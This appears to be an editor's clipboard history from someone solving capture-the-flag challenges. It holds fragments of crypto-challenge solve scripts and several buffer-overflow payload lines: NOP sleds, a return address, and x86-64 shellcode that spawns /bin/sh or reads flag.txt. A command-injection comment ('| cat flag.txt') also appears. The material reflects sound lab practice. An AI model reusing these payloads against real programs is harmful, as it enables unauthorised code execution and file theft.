	    plain = hex(int(xorkey, 16) ^ int(hashmd5, 16)).replace('0x','')
eb9f493b3850a7c0e4ad25045055f9f2|file:///home/neo/ccsc/djinn/ct.py|17|34|v|python
	.replace('L',''
87a429872c7faee7e8bc9268d5bf548e|file:///home/neo/ccsc/djinn/ct.py|17|11|v|python
	pain
231082ff42fb9d31c014d0b1c9b37927|file:///home/neo/ccsc/djinn/ct.py|6|1|V|python
	    print("Hash then xor:")
4d7c81999c672776d15ab720fabf183c|file:///home/neo/ccsc/djinn/ct.py|16|12|v|python
	Hash then xor:
9e4fc3e1f589c025a816425fe8d1f967|file:///home/neo/ccsc/djinn/ct.py|17|1|V|python
	    print(xorkey)
5235d90efc304c89c3989e346d482534|file:///home/neo/ccsc/djinn/ct.py|17|1|V|python
	    print(xorkey)
	    print(ctrstr)
2ec80ce7c48084d1ffac7518116f1fe3|file:///home/neo/ccsc/djinn/ct.py|6|1|V|python
	    print(xorkey)
	    print(ctstr)
01e09c5c2f6652a128a7023a61303c57|file:///home/neo/ccsc/djinn/ct.py|8|5|V|python
	    print
cf449163110c6ef0388ccb6fbbdd43e7|file:///home/neo/ccsc/djinn/ct.py|9|1|V|python
	    print(b.hex())
0c44eed5a7444acbf378d5ce317513d1|file:///home/neo/ccsc/djinn/ct.py|14|1|V|python
	    xorkey = repeat(key, 32)
2204cbc5c5aabc7b442a29dfcb8b419d|file:///home/neo/ccsc/djinn/ct.py|13|1|V|python
	    print(hashmd5)
785c59390ba5dddf68b3f0cdc858115c|file:///tmp/neomutt-neo-1000-3143-17963153962095653333|1|14|v|mail
	 I will be waiting for you to inform me.
91982647a17d83ea60977d0d4d10efb1|file:///home/neo/ccsc/calanthe/kgrams.py|1|1|V|python
	from nltk import ngrams
	
	sentence = 'this is a foo bar sentences and i want to ngramize it'
	
	n = 6
	sixgrams = ngrams(sentence.split(), n)
	
	for grams in sixgrams:
	  print grams
727ea1a4a66f4e5f9ec6d96bf26465b1|file:///home/neo/ccsc/calanthe/kgrams.py|2|1|v|python
	[b[i:i+n]
026a306b96b2e89ddd5f6d315887a89e|file:///home/neo/ccsc/calanthe/kgrams.py|1|1|V|python
	b = 'student'
713f961a2192e6806deb04db86da1e05|file:///home/neo/ccsc/calanthe/kgrams.py|2|5|v|python
	4
	for
606488ec068481f64b4a70d5037cfb89|file:///home/neo/ccsc/guydebois/shellcode.txt|49|1|V|text
	
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00"`
e8c0387cce8c815fad959119410b3c17|file:///home/neo/ccsc/guydebois/shellcode.txt|49|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x68\x78\x74\x2c\x31\x48\xb8\x2e\x2f\x66\x6c\x61\x67\x2e\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"`
e9041143fdf815a020b6a6b70ac84610|file:///home/neo/ccsc/guydebois/shellcode.txt|49|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x68\x78\x74\x2c\x31\x48\xb8\x2e\x2f\x66\x6c\x61\x67\x2e\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05\x00"`
5e73980238a03797aeb58e85ef5a186a|file:///home/neo/ccsc/guydebois/shellcode.txt|49|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x68\x78\x74\x2c\x31\x48\xb8\x2e\x2f\x66\x6c\x61\x67\x2e\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05\x90"`
da2c8fa3b3fa5117fdee200f663a96b7|file:///home/neo/ccsc/guydebois/shellcode.txt|48|1|V|text
	\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
ec502aafccd900a3f74ad27b0693c024|file:///home/neo/ccsc/guydebois/shellcode.txt|49|1|V|text
	r <<< `printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x68\x78\x74\x2c\x31\x48\xb8\x2e\x2f\x66\x6c\x61\x67\x2e\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05\x90"`
a1ce1ac4df1a7e452f4554d9b93d403a|file:///home/neo/ccsc/guydebois/shellcode.txt|49|16|v|text
	\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x
79d1f87d6cdd43162d7714b3cdb8c2f1|file:///home/neo/ccsc/guydebois/shellcode.txt|40|16|v|text
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x
8495c37769aa07e3171a1bf8669000ab|file:///home/neo/ccsc/guydebois/shellcode.txt|41|1|V|text
	r <<< `printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05"`
6835aab5250bc33473c2e0de1735d906|file:///home/neo/ccsc/guydebois/shellcode.txt|41|8|v|text
	printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05"
a2851f7c97595a3f60f5d333b42a1927|file:///home/neo/ccsc/guydebois/shellcode.txt|46|1|V|text
	r <<< `printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x90\x68\x78\x74\x2c\x31\x48\xb8\x2e\x2f\x66\x6c\x61\x67\x2e\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05\x90"`
641df2f0b9d8309475b90529b42fae65|file:///home/neo/ccsc/djinn/mappings|3|3|v|
	 -> 4
677ee366aafed209e5b5066ec9249356|file:///home/neo/ccsc/djinn/solve.py|32|4|V|python
	    # target = raw_input('Give target hash: ')
e14d17d5fe414f086d173730abf33a3d|file:///home/neo/ccsc/djinn/solve.py|31|5|V|python
	    print(menu)
f1a0359190609191042c15df00f7d819|file:///home/neo/ccsc/djinn/solve.py|31|15|v|python
	Target:
a5e4b542f40b963a0f17584e6f7ff64c|file:///home/neo/ccsc/djinn/ctf.py|22|1|V|python
	    if show:
	        print(menu)
29156ea90bff3dd7b588223aedd6f81f|file:///home/neo/ccsc/djinn/solve.py|33|5|V|python
	    log.info('%s' % (menu))
61fa72352648a5215b8dc33da2b99863|file:///home/neo/ccsc/djinn/solve.py|47|5|V|python
	    # menu = r.recvuntil('Decrypt this: ', drop=True)
adeb4550b2bb61a64ee67be6ccc7358b|file:///home/neo/ccsc/djinn/solve.py|50|5|V|python
	    # print(menu)
65ab7ffcb40650dd7a459aaf5bd3878f|file:///home/neo/ccsc/djinn/solve.py|51|5|V|python
	    log.info('Ci: %s' % (target))
c2866e78953e5fa246ffe5c327cf06fa|file:///home/neo/ccsc/djinn/solve.py|49|5|V|python
	    # xorkey = resHash*8
62830c61895dce9804799998a8d90763|file:///home/neo/ccsc/djinn/solve.py|52|5|V|python
	    # plain = hex(int(xorkey, 16) ^ int(ct, 16)).replace('0x','')
b63ff685ff64a45112253563517a8112|file:///home/neo/ccsc/djinn/solve.py|46|5|V|python
	    found = 1
c1b3c556dca52f62c2405eee75e9c928|file:///home/neo/ccsc/calanthe/kgrams.py|4|1|V|python
	for i in range(0,len(b)-n+1,2):
	    print(b[i:i+n])
dd0d6a4322c31e76de0b898b24e59a69|file:///home/neo/ccsc/djinn/solve.py|55|17|v|python
	t(ct[
f9a57801be1dbafc2fc5c6cfe3a7a2e9|file:///home/neo/ccsc/djinn/solve.py|56|13|v|python
	cutf8
d1cc1bb0d5c3020b467de8d073a3d174|file:///home/neo/ccsc/djinn/solve.py|53|1|V|python
	        log.info('Ciphertext: %s' % (ct))
a7a87acf7fa46e7a519ba613450da021|file:///home/neo/ccsc/djinn/solve.py|58|19|v|python
	Ciphertext
4b191bb4e7ba255e0e3c8bc183a1135a|file:///home/neo/ccsc/djinn/solve.py|58|9|V|python
	        log.info('3rd element: %s' % (current_ct[3]))
2b29216738ee6f3a87ef0345dc9239d4|file:///home/neo/ccsc/djinn/solve.py|57|9|V|python
	            # log.info('%s ', (ct[i:i+2]))
64b56ef61a2d2cf9c25016743d314ce2|file:///home/neo/ccsc/djinn/solve.py|49|13|V|python
	        # if show:
	        #     print(menu)
f8151408a550bd10c11e7cc2149cb76f|file:///home/neo/ccsc/themap/th.jpg|26204|1|V|
	pVaGeN
	OeBgUrEuBbQ Bs fBePrErEf
	eViVn
	aVyStNnEq
	oYnIvXrA
	GrZrEvN
	PeRlQrA
	NrQvEa
	oEbXvYvBa sBeRfG
	EvAqR
	YlEvN
	NrQvEa
	xNrQjRa
	gRzReVn
	fXrYyVtR
	XbIvE
9e001c8824c81489b376a4b301a80058|file:///media/neo/Storage/ctf/featherduster/featherduster/cities.txt|2|1|V|text
	OeBgUrEuBbQ Bs fBePrErEf
23aab552d833fe923b386e5b48872ec8|file:///home/neo/ccsc/djinn/solve.py|55|13|v|python
	current_char
a87deb01c5f539e6bda34829c8ef2368|file:///home/neo/ccsc/djinn/solve.py|55|21|v|python
	char
a2bce6f2dfd113845c53dff02a8a0419|file:///home/neo/ccsc/djinn/solve.py|56|31|v|python
	ct[i:i+2]
c4809c07621b780ec375e6f2eb314200|file:///home/neo/ccsc/djinn/solve.py|62|13|V|python
	            k
9c1f0b9e6d2a62536dff50d4385b9d1d|file:///home/neo/ccsc/djinn/solve.py|64|9|V|python
	        r.sendline('a')
8e2f30c3c4475de329d1220cd5b46d0e|file:///home/neo/ccsc/djinn/solve.py|65|1|V|python
	        # log.info('3rd element: %s' % (current_ct[3]))
c8627e1b073b67ef0939ff8dfa499d98|file:///home/neo/ccsc/djinn/solve.py|63|27|v|python
	3rd element
6809dda0987fe5861ae4ce83d8316c5d|file:///home/neo/ccsc/djinn/solve.py|63|49|v|python
	current_ct[3]
70b9d9d0066fdd649df84268e1422731|file:///home/neo/ccsc/djinn/solve.py|61|13|V|python
	                r.sendline('a')
11e144fd244e9a9df37f6d1e371bd8cc|file:///home/neo/ccsc/djinn/solve.py|65|9|V|python
	        if (find)
e949e75b9d5fb3e4fd3f86dedeba8cff|file:///home/neo/ccsc/djinn/solve.py|63|1|V|python
	                log.info('Correct input: %s' % (received))
c5946eb9400717fd6f40e26e36cdb498|file:///home/neo/ccsc/djinn/solve.py|66|34|v|python
	received
f0d0ecb1b13e9db866d5aa166e730d94|file:///home/neo/ccsc/djinn/solve.py|61|23|V|python
	                r.sendline('a')
	                received = r.recvline().strip()
92834057af6b0c416bd0c207c14906f6|file:///home/neo/ccsc/djinn/solve.py|55|1|V|python
	        log.info('Correct input: %s' % (received))
4e69905daaa441f3c8249c8d0f56e8b3|file:///home/neo/ccsc/djinn/solve.py|60|23|v|python
	Correct input: 
3cb00b1ca5bab2e1d24b39707f592d73|file:///home/neo/ccsc/djinn/solve.py|60|1|V|python
	            log.info('Code position %s' % (i/2))
4aff5817049947fdfd239394b0392294|file:///home/neo/ccsc/djinn/solve.py|61|23|v|python
	Code position 
cd2947c519176e92ba63121f38fa8506|file:///home/neo/ccsc/djinn/solve.py|62|13|V|python
	            output = []
e1b3af40f85235be832075a0e34bbbd0|file:///home/neo/ccsc/djinn/solve.py|64|17|V|python
	                output.append(current_known_dict[current_code])
ed46706efc5fc28683ad4b7f30e0cd36|file:///home/neo/ccsc/djinn/solve.py|64|13|V|python
	            else:
399116dfe988a1785c42a603550d39ab|file:///home/neo/ccsc/djinn/solve.py|65|36|V|python
	            for mapping in mappings:
	                log.info('%s' % (mapping))
012d0de4726d1dd6c4d12097800e09b0|file:///home/neo/ccsc/djinn/solve.py|51|1|V|python
	        menu = r.recvuntil('Decrypt this:', drop=True)
639d91379f1ea3368a8d9fba878ad569|file:///home/neo/ccsc/djinn/solve.py|57|29|v|python
	Decrypt this
b6cbb8c1d72e4ee9f2897c76b1e2e351|file:///home/neo/ccsc/djinn/local.py|10|1|V|python
	host = '192.168.125.10'
	port = 2000
4a4950a627d734675b4f6e628734776c|file:///home/neo/ccsc/djinn/local.py|30|1|V|python
	# log.info('Target: %s' % (target))
3a7fc8e28ae60fc0a6e3cea7052ca6ce|file:///home/neo/ccsc/djinn/local.py|31|2|v|python
	log.info
66712d954505ba92313750aaf75e7476|file:///home/neo/ccsc/djinn/local.py|36|1|V|python
	        # log.info('Solved - %s' % resHash)
4c0050952e84849a3f1622676ab37f80|file:///home/neo/ccsc/djinn/local.py|37|9|v|python
	# log.info
a379be989d72c230320e5ffc78017be2|file:///home/neo/ccsc/djinn/solve.py|58|1|v|python
	Here's what you should've sent
855a3e406e8a9afb52629a112b0759ba|file:///home/neo/ccsc/djinn/solve.py|56|9|V|python
	        received = r.recvline().strip()
6f01032fae48d591c7f009d774d47faa|file:///home/neo/ccsc/djinn/solve.py|66|1|V|python
	            log.info('Code %s' % (current_code))
ca0dbad92a874b2f69b549293387925e|file:///home/neo/ccsc/djinn/solve.py|67|23|v|python
	Code
8d5b511d1a448828c24ea88d71f0fda6|file:///home/neo/ccsc/djinn/solve.py|67|45|v|python
	current_code
10ae948cd194e89a66c56937312d00fd|file:///home/neo/ccsc/djinn/solve.py|59|9|V|python
	        # log.info('Correct input: %s' % (received))
02db1205eb93888ea37405e74b464417|file:///home/neo/ccsc/djinn/solve.py|62|1|V|python
	        for i in range(0,len(ct)-1,2):
ee0db283e1249f4c5825f8a5ac3e4de2|file:///home/neo/ccsc/djinn/solve.py|64|9|V|python
	        output = []
779afa781b52602179cae821349306c7|file:///home/neo/ccsc/djinn/solve.py|65|1|V|python
	        for i in range(0,len(ct)-1,2):
	            current_known_dict = mappings[i/2]
2b6e795789b9715ad997a0728b66e1ec|file:///home/neo/ccsc/djinn/solve.py|58|9|V|python
	        for i in range(32):
	            current_dict = mappings[i]
b8d27b5a48274d2f756bef1f25a57c1a|file:///home/neo/ccsc/djinn/solve.py|71|1|V|python
	            if current_code not in current_known_dict:
22bc19c89dd5b0d8a013fb7b84ce8430|file:///home/neo/ccsc/djinn/solve.py|59|13|V|python
	            if
bb0ab68f971da3c3b3d183ebb26bb0ed|file:///home/neo/ccsc/djinn/solve.py|67|1|V|python
	            current_code = ct[i:i+2]
44114fd344c6eada581e75c26fc0d55b|file:///home/neo/ccsc/djinn/solve.py|59|29|v|python
	not 
ade6f9ec979940a8e4043582f98b5f80|file:///home/neo/ccsc/djinn/solve.py|63|20|^v|python
	''.join(map(str, output))
c52393ea88681a6afa7949df8de248ae|file:///home/neo/ccsc/djinn/solve.py|64|19|v|python
	Correct input
69a9185dcdf427fbf67f6a3642728c59|file:///home/neo/ccsc/djinn/solve.py|64|9|V|python
	        log.info('Sending: %s' % (output_str))
7ede1000d96a5e70fe85854b82b8ce6f|file:///home/neo/ccsc/djinn/solve.py|66|1|V|python
	        r.sendline(output_str)
f356e2010e2734155a4ec682796e50f8|file:///home/neo/ccsc/djinn/solve.py|65|1|V|python
	        log.info('Sending: %s' % (output_str))
	        r.sendline(output_str)
dc7d457714840174342bca620044968c|file:///home/neo/ccsc/djinn/solve.py|65|1|V|python
	            log.info('Sending: %s' % (output_str))
e4b0c2b6d59cb4cf3e169a9886008087|file:///home/neo/ccsc/djinn/solve.py|69|23|v|python
	Sending
0a5bf14d50f047d7bb1ef22750f27ed4|file:///home/neo/ccsc/djinn/solve.py|69|41|v|python
	output_str
9c55b0142e74ab135b00ba9df6357c09|file:///home/neo/ccsc/djinn/solve.py|68|1|V|python
	            next_line = r.recvline()
	            log.info('Next line: %s' % (next_line))
e9508f9dbb4859a2304bf70e6a056c36|file:///home/neo/ccsc/jaskier/solve.py|70|1|V|python
	# b64dec = bytearray(input)
	# b64dec = b'| cat flag.txt'
95e2845998a26ff29457b05b81d4e2ab|file:///home/neo/ccsc/jaskier/solve.py|71|1|V|python
	print(b64dec)
	decrypted = decrypt(b64dec).decode('utf-8')
	print(decrypted)
8c08d12b4100c578bdceb5835a951a6a|file:///home/neo/ccsc/jaskier/solve.py|75|1|v|python
	ecrypted
dd1ca4f7918078669a36e5501ffed3d5|file:///home/neo/ccsc/jaskier/solve.py|75|27|v|python
	.decode('utf-8')
65a9530f2a02479b1b23bad6967ef561|file:///home/neo/ccsc/jaskier/solve.py|59|1|V|python
	    blocks = blockify(ct, BLOCK_SIZE, b'\x00') 
	    # for blk in blocks:
b70bbdfcd19bf4a62b5363d2707c1dfb|file:///home/neo/ccsc/jaskier/solve.py|34|1|V|python
	    """
	    Decrypt function
	    Global Vars:
	    ------------
	    BLOCK_SIZE = 2
	    TABLE_DIM = 4
0d0686d3390843ec7e26669ad8211077|file:///home/neo/ccsc/echoes/sourcery.txt|10|1|V|text
	filename = '/home/tissaia/Desktop/flag.png'
	with open(filename, 'rb') as f:
	    content = f.read()
	
	#secret = binascii.hexlify(content)
6732e7ac5dbe6ad748733aad1b5a2079|file:///home/neo/ccsc/echoes/test.png|1|1|V|
	89504e470d0a1a0a0000000d49484452000001c2000000fd08060000002f437789000000097048597300000ec400000ec401952b0e1b0000200049444154789cec9d7980645579e87fdf39f75675cf3e8303033a080c32b8c4080a98282e318a0bf2501189db4ba2262f62dc89019f4f838991e8d3608c9a3c88fa14e3023e884a6433511050342220088a0c8a02b20cc32cdd5d75ef39ef8fef9c7b6f55ddeaaeeeaeeaeec1f9a0a6baee72f6f3eddf7764d5cae59e25021e0164b475f801bbebb5251eca26f9c15bd7f1debcc1cde3ddb98fe9c063b5c860cca857cdccb0686bb7664dd6aebd59acddbe650c0d065dcff3195387f78bbd2a16167ad7c7a0e3371ffc525fbfc8f0c6dec77f3bba370fbc56732d99534923034f6f33478f60963e989a6b75d3d9efda9e311d3d8c7e9ceb908bf7be76d6eb2f2e15980d3b39f7311581dd84971b0a884817315ce0bd2f5a9bec8663bea4086121818db28e3ec8a40e7ccf1f4b09464fc8443c2041da09b0089825cb329cebcfb50e91f91c322c52c38634478bbfeceb5a301b22ba6417c68242277eab1b9321cd7445733654a82d77fe735b2d6e4911c28581de59aa43a4552238db21ef4b4047be2f475141ecc4e221953ccfc9b26cd1eadf037b600f3cb461c911c27aa6623e9c61370cc6aea8e41864543ffd9bfd5a52bdeefb153042fa1239c1f9eaeba5da7029fed96d6c887b600fec813d301dd4199f960448f1897aeeea673e6006fc04e22102267cca464dab6aafbb35e0ab4387e119ad7bc75e443a3ebb151c0abc0838b0cffd04781af098056bd1f0e140e0f717bb11f38487032f049a8bdd9021c2387002b0a6ebfa238063182d567e0ef0e87996d1
ea65c7251ba29467d561d23784177451|file:///home/neo/ccsc/guydebois/shellcode.txt|40|160|v|text
	\x67\x06\x40\x00\x00\x00\x00\x00\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05
044f6c24ba50abcf5dc89506142e8335|file:///home/neo/ccsc/guydebois/shellcode.txt|40|128|v|text
	\x90\x90\x90\x90\x90\x90\x90\x90\x
7c288a63f4c0b80caaed9e5658929f04|file:///home/neo/ccsc/guydebois/skeleton.py|34|14|v|python
	\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x
8dd6621e612da46a64d978cf67b2d9a0|file:///home/neo/ccsc/guydebois/skeleton.py|34|13|^v|python
	"\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\
adcd7cb775172add4d65aea4f88cee4e|file:///home/neo/ccsc/guydebois/skeleton.py|35|1|V|python
	"\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\"
76d07b1ef1b437865bee9935c871a2bb|file:///home/neo/ccsc/guydebois/shellcode.txt|37|14|v|text
	 "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
e11f0f6f9c494b0010c8749c77624493|file:///home/neo/ccsc/guydebois/shellcode.txt|40|14|v|text
	 "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05"
4d75968667c2e4b95449f06a7954f5e1|file:///home/neo/ccsc/guydebois/shellcode.txt|40|16|v|text
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05
03c2a1b327545109a48124f50698ffb8|file:///home/neo/ccsc/guydebois/shellcode.txt|54|16|v|text
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x49\x89\xf8\x6a\x01\xfe\x0c\x24\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x48\x89\xc3\x48\x89\xc7\x6a\x05\x58\x48\x89\xe6\x0f\x05\x48\x83\xc4\x30\x48\x8b\x14\x24\x49\x89\xd2\x6a\x28\x58\x4c\x89\xc7\x48\x89\xde\x99\x0f\x05
9d7183f16acce70658f686ae7f1a4d20|file:///home/neo/ccsc/guydebois/skeleton.py|22|11|v|python
	binary
b484857901742afc9e9d4e9853596ce2|file:///home/neo/ccsc/guydebois/skeleton.py|38|13|v|python
	pack
3e7d77be901988ce6b6dd80040facfd6|file:///home/neo/ccsc/guydebois/skeleton.py|43|12|v|python
	pack(
e24b3eea3c87b6abe79a28ede8bc272b|file:///home/neo/ccsc/guydebois/skeleton.py|23|1|V|python
